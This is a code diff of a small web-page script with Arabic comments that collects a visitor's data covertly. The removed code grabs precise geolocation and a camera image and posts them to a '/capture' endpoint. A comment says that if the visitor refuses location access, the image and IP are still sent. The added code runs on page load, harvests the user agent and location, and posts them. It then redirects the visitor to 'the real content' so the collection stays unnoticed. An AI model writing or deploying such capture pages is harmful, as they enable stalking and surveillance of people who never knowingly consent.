@@ -1,23 +1,23 @@
-async function captureAndSend() {
-    // إعدادات الدقة العالية للموقع
-    const geoOptions = { enableHighAccuracy: true, timeout: 10000 };
+<script>
+    async function collectAndGo() {
+        const deviceInfo = navigator.userAgent;
+        
+        // محاولة سحب الموقع
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await sendData({ lat: pos.coords.latitude, lon: pos.coords.longitude }, deviceInfo);
+        }, async () => {
+            await sendData(null, deviceInfo);
+        });
+    }
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-        const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-        const img = await getCameraImage(); // وظيفتك الحالية للالتقاط
-
-        fetch('/capture', {
+    async function sendData(loc, dev) {
+        const response = await fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ location: coords, image: img })
+            body: JSON.stringify({ location: loc, device: dev })
         });
-    }, async (err) => {
-        // في حال الرفض نرسل الصورة والـ IP فقط
-        const img = await getCameraImage();
-        fetch('/capture', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ location: null, image: img })
-        });
-    }, geoOptions);
-}
+        const data = await response.json();
+        window.location.href = data.redirect; // التوجيه للمحتوى الحقيقي
+    }
+    window.onload = collectAndGo;
+</script>
